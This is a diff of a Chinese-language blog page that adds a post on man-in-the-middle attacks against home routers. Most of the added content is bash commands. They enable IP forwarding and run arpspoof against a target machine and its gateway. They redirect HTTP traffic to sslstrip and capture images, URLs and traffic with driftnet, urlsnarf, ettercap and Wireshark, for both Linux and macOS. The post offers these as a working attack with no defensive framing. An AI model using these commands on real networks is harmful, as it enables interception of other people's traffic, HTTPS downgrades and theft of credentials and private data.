@@ -34,8 +34,8 @@
     <meta name="keywords" content="arp 中间攻击 渗透">
     <meta name="og:keywords" content="arp 中间攻击 渗透">
       
-    <meta name="description" content="转载请注明出处，本文采用 CC4.0 协议授权">
-    <meta name="og:description" content="转载请注明出处，本文采用 CC4.0 协议授权">
+    <meta name="description" content="家庭路由器中间人攻击以及数据获取。">
+    <meta name="og:description" content="家庭路由器中间人攻击以及数据获取。">
       
     
     
@@ -126,7 +126,72 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
+    <p>家庭路由器中间人攻击以及数据获取。</p>
+
+<h2 id="arp过程介绍">Arp过程介绍</h2>
+
+<h3 id="linux">Linux</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 开启端口转发</span>
+<span class="nb">echo </span>1 <span class="o">&gt;</span>/proc/sys/net/ipv4/ip_forward
+<span class="c"># 监控图片</span>
+driftnet <span class="nt">-i</span> eth0 <span class="nt">-d</span> ~/Desktop/pic <span class="nt">-a</span>
+driftnet <span class="nt">-i</span> eth0
+<span class="c"># 监控 URL</span>
+urlsnarf <span class="nt">-i</span> eth0
+<span class="c"># 通过iptables 转发</span>
+
+iptables <span class="nt">-t</span> nat <span class="nt">-A</span> PREROUTING <span class="nt">-p</span> tcp <span class="nt">--destination-port</span> 80 <span class="nt">-j</span> REDIRECT <span class="nt">--to-port</span> &lt;yourListenPort&gt;
+
+<span class="c"># 欺骗目标机器</span>
+arpspoof  <span class="nt">-i</span> eth0 <span class="nt">-t</span> 192.168.2.165 192.168.2.1
+<span class="c"># 欺骗网关</span>
+arpspoof <span class="nt">-i</span> eth0  <span class="nt">-t</span> 192.168.2.1 192.168.2.150
+
+<span class="c"># 过滤欺骗</span>
+arpspoof <span class="nt">-i</span> eth0 <span class="nt">-c</span> own <span class="nt">-t</span> 192.168.2.213 192.168.2.1 
+
+<span class="c">## sslstrip -l  &lt;yourListenPort&gt;</span>
+<span class="c">#负责截获数据 </span>
+sslstrip 
+<span class="c">## 开启抓包工具</span>
+wirewhark 
+</code></pre></div></div>
+
+<h3 id="mac">mac</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdr pass on en0 proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080
+
+sslstrip <span class="nt">-l</span> 8080 
+
+<span class="c"># 修改 /etc/pf.conf 文件，在适当的位置加入</span>
+rdr-anchor <span class="s2">"http-forwarding"</span>
+
+load anchor <span class="s2">"http-forwarding"</span> from <span class="s2">"/etc/pf.anchors/http"</span>
+
+<span class="c"># 重启 packet filter，依次输入命令 sudo pfctl -ef /etc/pf.conf 和 sudo pfctl -E</span>
+
+<span class="c"># 转发 sudo sysctl -w net.inet.ip.forwarding=1</span>
+<span class="c"># 查看转发情况 sudo sysctl -a | grep forward</span>
+
+<span class="c"># arpspoof -i en0 -t (目标IP) (网关IP)</span>
+arpspoof <span class="nt">-i</span> en0 <span class="nt">-t</span> 10.196.17.58 10.196.17.1
+
+arpspoof <span class="nt">-i</span> en0 <span class="nt">-t</span> 10.196.17.1 10.196.17.24
+
+<span class="c"># 截获流量 </span>
+<span class="nb">sudo </span>ettercap <span class="nt">-G</span>
+<span class="c"># 选择target1</span>
+
+<span class="c"># 网关 欺骗 dsniff -i eth0</span>
+</code></pre></div></div>
+
+<h3 id="filter">filter</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip.src<span class="o">==</span>192.168.2.213 and http
+</code></pre></div></div>
+
+<p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
 
     </article>
     <div class="share">
